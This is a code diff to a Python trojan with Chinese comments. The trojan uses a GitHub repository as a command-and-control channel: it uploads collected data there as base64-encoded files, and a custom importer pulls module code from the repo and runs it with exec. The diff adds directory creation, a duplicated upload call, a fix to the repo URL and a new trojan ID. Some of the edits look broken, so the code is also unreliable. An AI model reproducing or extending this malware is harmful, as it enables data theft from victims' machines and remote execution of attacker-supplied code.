@@ -61,6 +61,12 @@ class Trojan:
         bindata = bytes('%r' % data, 'utf-8')  # 将结果转换为字节
         self.repo.create_file(remote_path, message, base64.b64encode(bindata))  # 创建文件并上传到GitHub
 
+        # 创建存储结果的文件夹（如果不存在）
+        if not self.repo.contents(f'data/{self.id}'):
+            self.repo.create_directory(f'data/{self.id}')
+
+        self.repo.create_file(remote_path, message, base64.b64encode(bindata))  # 创建文件并上传到GitHub
+
     # 运行木马
     def run(self):
         while True:
@@ -90,14 +96,15 @@ class GitImporter:
             return self
 
     def load_module(self, name):
-        spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.get_url)
+        spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)
         new_module = importlib.util.module_from_spec(spec)  # 创建模块对象
         exec(self.current_module_code, new_module.__dict__)  # 执行模块代码
         sys.modules[spec.name] = new_module  # 将模块添加到sys.modules中
         return new_module
 
 
+
 if __name__ == '__main__':
     sys.meta_path.append(GitImporter())  # 添加自定义模块导入器
-    trojan = Trojan('abc')  # 创建木马对象
+    trojan = Trojan('TROJANID')  # 创建木马对象
     trojan.run()  # 运行木马
